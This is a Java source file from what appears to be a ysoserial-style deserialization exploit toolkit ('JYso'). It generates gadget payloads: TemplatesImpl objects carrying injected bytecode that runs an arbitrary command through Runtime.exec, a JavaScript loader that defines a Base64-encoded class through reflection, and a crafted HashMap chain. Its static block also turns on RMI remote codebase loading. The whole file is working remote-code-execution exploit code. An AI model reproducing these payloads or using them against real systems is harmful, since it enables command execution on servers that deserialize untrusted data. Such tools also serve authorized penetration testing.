package com.qi4l.JYso.gadgets.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.CtClass;
import javassist.CtConstructor;

import java.lang.reflect.*;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import static com.qi4l.JYso.gadgets.Config.Config.*;
import static com.qi4l.JYso.gadgets.utils.Utils.saveCtClassToFile;
import static com.qi4l.JYso.gadgets.utils.handle.ClassFieldHandler.insertField;
import static com.qi4l.JYso.gadgets.utils.handle.ClassMethodHandler.insertCMD;
import static com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler.generateClassName;
import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.generateClass;
import static com.qi4l.JYso.gadgets.utils.handle.GlassHandler.shrinkBytes;
import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

@SuppressWarnings({"rawtypes", "unchecked","unused"})
public class Gadgets extends ClassLoader {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    public static Class<?> TPL_CLASS = TemplatesImpl.class;
    public static Class<?> ABST_TRANSLET = AbstractTranslet.class;
    public static Class<?> TRANS_FACTORY = TransformerFactoryImpl.class;

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");

        try {
            // 兼容不同 JDK 版本
            if (Boolean.parseBoolean(System.getProperty("properXalan", "false")) || FORCE_USING_ORG_APACHE_TEMPLATESIMPL) {
                TPL_CLASS = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
                ABST_TRANSLET = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                TRANS_FACTORY = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
            }
        } catch (Exception ignored) {
        }
    }


    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();

        // 支持单双引号
        if (command.startsWith("'") || command.startsWith("\"")) {
            command = command.substring(1, command.length() - 1);
        }

        CtClass ctClass;
        byte[] classBytes = new byte[0];
        String newClassName = generateClassName();


        final Object templates = TPL_CLASS.newInstance();
        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
        POOL.get(ABST_TRANSLET.getName());

        // 扩展功能
        if (command.startsWith("LF-")) {
            ctClass = generateClass(command, newClassName);
        } else {
            // 普通的命令执行
            if (IS_OBSCURE) {
                ctClass = POOL.makeClass(newClassName);
                insertCMD(ctClass);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            } else {
                // 最短化
                ctClass = POOL.makeClass(newClassName);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            }
        }

        // 如果全局配置继承，再设置父类
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            if (ctClass != null) {
                shrinkBytes(ctClass);
            }

            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
            // 否则直接设置父类
            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
            }
        }

        // 按需保存文件
        saveCtClassToFile(ctClass);
        if (ctClass != null) {
            classBytes = ctClass.toBytecode();
        }

        // 加载 class 试试
//		loadClassTest(classBytes, ctClass.getName());

        // 写入前将 classBytes 中的类标识设为 JDK 1.6 的版本号
        classBytes[7] = 49;

        // 恶意类是否继承 AbstractTranslet
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        } else {
            CtClass newClass = POOL.makeClass(generateClassName());
            insertField(newClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");

            Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, newClass.toBytecode()});
            // 当 _transletIndex >= 0 且 classCount 也就是生成类的数量大于 1 时，不需要继承 AbstractTranslet
            Reflections.setFieldValue(templates, "_transletIndex", 0);
        }

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "anyStr");
        Reflections.setFieldValue(templates, "_tfactory", TRANS_FACTORY.newInstance());
        return templates;
    }

    public static String createClassT(String command) throws Exception {
        command = command.trim();

        // 支持单双引号
        if (command.startsWith("'") || command.startsWith("\"")) {
            command = command.substring(1, command.length() - 1);
        }

        CtClass ctClass;
        String newClassName = generateClassName();

        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
        POOL.get(ABST_TRANSLET.getName());

        // 扩展功能
        if (command.startsWith("LF-")) {
            ctClass = generateClass(command, newClassName);
        } else {
            // 普通的命令执行
            if (IS_OBSCURE) {
                ctClass = POOL.makeClass(newClassName);
                insertCMD(ctClass);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            } else {
                // 最短化
                ctClass = POOL.makeClass(newClassName);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            }
        }

        // 如果全局配置继承，再设置父类
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            if (ctClass != null) {
                shrinkBytes(ctClass);
            }

            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
            // 否则直接设置父类
            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
            }
        }

        byte[] bytes = null;
        if (ctClass != null) {
            bytes = ctClass.toBytecode();
        }
        String classCode = Base64.getEncoder().encodeToString(bytes);
        //System.out.println("Base64 Encoded CtClass: " + classCode);
        if (ctClass != null) {
            ctClass.detach();
        }

        if (ctClass != null) {
            return "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
                    "   var clazz = classLoader.loadClass('" + ctClass.getName() + "');\n" +
                    "   clazz.newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";
        }
        return newClassName;
    }

    public static String createClassB(String command) throws Exception {
        command = command.trim();

        // 支持单双引号
        if (command.startsWith("'") || command.startsWith("\"")) {
            command = command.substring(1, command.length() - 1);
        }

        CtClass ctClass;
        String newClassName = generateClassName();

        POOL.insertClassPath(new ClassClassPath(ABST_TRANSLET));
        POOL.get(ABST_TRANSLET.getName());

        // 扩展功能
        if (command.startsWith("LF-")) {
            ctClass = generateClass(command, newClassName);
        } else {
            // 普通的命令执行
            if (IS_OBSCURE) {
                ctClass = POOL.makeClass(newClassName);
                insertCMD(ctClass);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{execCmd(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            } else {
                // 最短化
                ctClass = POOL.makeClass(newClassName);
                CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
                ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
                ctClass.addConstructor(ctConstructor);
            }
        }

        // 如果全局配置继承，再设置父类
        if (IS_INHERIT_ABSTRACT_TRANSLET) {
            if (ctClass != null) {
                shrinkBytes(ctClass);
            }

            // 如果 payload 自身有父类，则使用 ClassLoaderTemplate 加载
            // 否则直接设置父类
            if (ctClass != null && !"java.lang.Object".equals(ctClass.getSuperclass().getName())) {
                ctClass = Utils.encapsulationByClassLoaderTemplate(ctClass.toBytecode());
            }
        }

        String className = null;
        if (ctClass != null) {
            className = ctClass.getName();
        }
        if (ctClass != null) {
            ctClass.writeFile();
        }

        //writeClassToFile(className, ctClass.toBytecode());

        return className;
    }

    public static HashMap maskmapToString(Object o1, Object o2) throws Exception {
        Map tHashMap1 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        Map tHashMap2 = (Map) Reflections.createWithoutConstructor("javax.swing.UIDefaults$TextAndMnemonicHashMap");
        tHashMap1.put(o1, null);
        tHashMap2.put(o2, null);
        Reflections.setFieldValue(tHashMap1, "loadFactor", 1);
        Reflections.setFieldValue(tHashMap2, "loadFactor", 1);
        HashMap<Object,?> hashMap = new HashMap<>();
        Class<?> node = Class.forName("java.util.HashMap$Node");
        Constructor<?> constructor = node.getDeclaredConstructor(int.class, Object.class, Object.class, node);
        constructor.setAccessible(true);
        Object node1 = constructor.newInstance(0, tHashMap1, "Unam4", null);
        Object node2 = constructor.newInstance(0, tHashMap2, "SpringKill", null);
        Reflections.setFieldValue(hashMap, "size", 2);
        Object arr = Array.newInstance(node, 2);
        Array.set(arr, 0, node1);
        Array.set(arr, 1, node2);
        Reflections.setFieldValue(hashMap, "table", arr);
        return hashMap;
    }
}